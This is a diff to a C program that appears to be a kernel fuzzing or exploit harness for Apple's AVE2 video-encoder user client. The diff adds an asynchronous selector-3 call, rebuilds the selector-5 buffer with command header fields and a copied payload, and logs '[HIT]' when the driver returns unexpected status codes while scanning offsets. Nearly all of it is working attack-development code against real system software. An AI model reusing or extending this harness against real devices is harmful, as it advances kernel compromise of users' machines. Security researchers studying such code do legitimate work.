@@ -500,6 +500,12 @@ int main(void) {
         int hits = 0;
         for (int o = lo; o + 0x18 <= hi && hits < 40; o += 4) {
             if (create_session(1, &c) != 0) { printf("[-] create at o=0x%x\n", o); break; }
+            /* v51: sel3 async is mandatory (UC+0x100 gate for sel5 executor) */
+            { uint8_t din[0x40]; memset(din,0,sizeof(din)); memcpy(din,"904.76.7",8);
+              iodyn_async_ref_t aref; memset(aref,0,sizeof(aref)); aref[0]=1;
+              memset(out,0xAA,sizeof(out)); size_t o2=0x20;
+              p_IOConnectCallAsyncStructMethod(c,3,wake,aref,8,din,0x38,out,&o2); }
+            drain_wake(wake, 50);
             fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
             uint8_t d4[0x1a0a0]; memset(d4,0,sizeof(d4)); memcpy(d4,stat_in,0x1a0a0);
             const char *mp = patch; if (mp) apply_patch_quiet(d4, mp);
@@ -518,19 +524,21 @@ int main(void) {
             }
             uint8_t o4[0x20]; size_t o4z = 0x20; memset(o4, 0xAA, sizeof(o4));
             kern_return_t k4 = p_IOConnectCallStructMethod(c, 4, d4, sizeof(d4), o4, &o4z);
-            uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
-            *(uint32_t *)(d5 + 0x28) = 1;
-            uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
-            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
-            if (getenv("AVE2_LADDER")) {
-                if (k4 == 0 && k5 != 0xe00002d9u && k5 != 0xe0000001u) {
-                    printf("[LADDER] o=0x%x sel4=0x%08x sel5=0x%08x\n", o, k4, k5);
-                    hits++;
-                }
-            } else if (k4 != 0 || (k5 != 0xe0000001u && k5 != 0xe00002d9u)) {
+            /* v51: sel5 layout per v47 verdict — 0x30 cmd header + payload @+0x30 */
+            { uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5));
+              const char *sv5 = getenv("AVE2_S5SID");
+              uint32_t sid5 = sv5 ? (uint32_t)strtoul(sv5,0,0) : 1;
+              *(uint32_t *)(d5 + 0x04) = 5;             /* eUCCmd = AVE_UCCmd_Start */
+              *(uint32_t *)(d5 + 0x10) = 1;             /* iDataCnt */
+              *(uint32_t *)(d5 + 0x28) = sid5;          /* iUCInfoSID */
+              memcpy(d5 + 0x30, stat_in, 0x1a080);      /* Prepare payload */
+              uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
+              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
+              if (k4 != 0 || (k5 != 0xe0000001u && k5 != 0xe00002d9u)) {
                 printf("[HIT] o=0x%x sel4=0x%08x sel5=0x%08x\n", o, k4, k5);
                 hits++;
                 if (getenv("AVE2_SCAN_ALL")) continue;
+              }
             }
             destroy_close(c);
         }
